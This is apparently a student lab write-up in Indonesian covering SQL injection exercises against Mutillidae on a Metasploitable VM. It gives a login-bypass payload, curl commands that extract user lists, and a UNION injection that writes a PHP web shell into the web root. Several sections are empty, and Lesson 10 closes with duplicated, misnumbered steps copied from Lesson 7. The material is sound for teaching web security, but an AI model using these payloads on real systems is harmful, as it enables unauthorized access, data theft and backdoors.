# Tugas-Final-PKSJ
Tugas final PKSJ 2017
 OLEH 
- 5114100092    KHARISMA MONIKA
- 5114100131    Michael Dave
- 5114100081    M. Luqmanul Hakim

## Multidiae
### Lesson 5
  1. Membuka halaman mutillidae dengan memasukan URL sebagai berikut [IP_metasploitable]/mutillidae seperti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/home.png "Mutillidae Homepage") 
pada gambar 192.168.56.101/mutillidae

2. Pilih halaman login dengan menekan tulisan login di sebelah kiri atas dari halaman mutillidae
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/login.png "Mutillidae Login page")

3. Isikan (') / petik satu / single_quote pada kolom name seperti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/single_quote_test.png "Mutillidae single quote test")
Lalu tekan enter

4. Dapat dilihat dibagian atas muncul error log yang memberikan indikasi mengenai format dari dari perintah SQL untuk login
yaitu SELECT * FROM accounts WHERE username=''' AND password=''
dimana (') menyebabkan error pada eksekusi command sql.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/single_quote_test_report.png "Mutillidae single quote test report")

5. Dengan demikian maka dapat dilakukan login dengan mem-bypass password menggunakan sql injection dengan mengetikan perintah
sebagai berikut "'or 1=1-- " (petik 2 tidak perlu diketik juga)
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/bypass_password_username_test.png "Mutillidae bypass login")
Perhatikan untuk memberikan spasi di akhir dari tanda (-- ).
Lalu tekan enter.

6. Hasilnya
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/bypass_password_username_test_report.png "Mutillidae login as admin")
Perhatikan frasa logged in as Admin:admin

### Lesson 6

### Lesson 7
Note : harus mengganti settingan database pada metasploit, database name diubah menjadi owsp10

 1. Buka Mutillidae pada Browser dengan IP/mutillidae
 2. OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info
 ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/section%208%20user%20info.PNG "Tampilan USer Info")
 3. Settig proxy firefox dengan alamat 127.0.0.1:8080
 4. Setting Burpsuite, dengan menonaktifkan intercept
 5. Di page user info masukkan username:
  ' 1=1-- 
  Lihat URL yang dihasilkan. Url yang dihasilkan seperti berikut : 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/bypass_password_username_test.png "Tampilan User Page Info")
  http://192.168.149.101/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details
      Terlihat +or+1%3D1-- 
        Keterangan :
        + : space
        %3D : =
   ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/SQL%20Injection%20Obtain%20Userlist.PNG "LIST Username")
  6. Lihat di history http di burpsuite. History burpsuite menunjukkan encoded sql injection. Untuk proses selanjutnya menggunakan curl.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/history%20burpsuite.PNG "History burpsuite")
  7. SQL injection dengan curl. dengan perintah " curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://192.168.1.111/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}' "
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20curl.PNG "HASIL CURL")
  
  8. Membuat output file dengan memasukkan hasil curl pada lesson7.txt dengan perintah "  curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://192.168.1.111/mutillidae/index.php" | grep "Username=" > lesson7.txt  " 
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20cat%20lesson7.PNG "HASIL CAT CURL")
  
  9. Selanjutnya adalah SQL injection dengan Perl. Download Script Output parser, dengan perintah wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT
  10. Rename menjadi extensi perl, dengan perintah mv lesson7.pl.TXT lesson7.pl
  11. ubah permission agar dapat membaca dengan perintah chmod 700 lesson7.pl
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/download%20output%20parser.PNG "HASIL DOWNLOAD PERL")
  
  12. Jalankan script perl dengan perintah ./lesson7.pl
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
   
### Lesson 8
### Lesson 9
### Lesson 10
  1. Melihat database pada mutillidae. 
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20database%20dan%20use%20owasp10.PNG "DATABASES PADA MUTILLIDAE")
    2. Melihat tabel database owasp10
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20tables%20owasp10.PNG "TABEL PADA OWASP10")
    3. Melihat field pada tabel account
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/desc%20accounts.PNG "FIELD TABEL ACCOUNT")
    4. Buka mutillidae pada browser
    5. Menuju menu user info. OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info
    6. Inspect elemen pada textbox name, lalu ubah size.
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/inspect%20elemet%20100.PNG "INSPECT ELEMEN dan UBAH SIZE")
    7. Melakukan Backdoor Union SQL Union Injection. Dengan perintah " ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --  "
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
    12. Jalankan script perl dengan perintah ./lesson7.pl
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
    12. Jalankan script perl dengan perintah ./lesson7.pl
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
### Lesson 11

## Cuckoo
### Instalasi
### Konfigurasi
### Testing

## Snort
### Instalasi
### Konfigurasi
### Testing
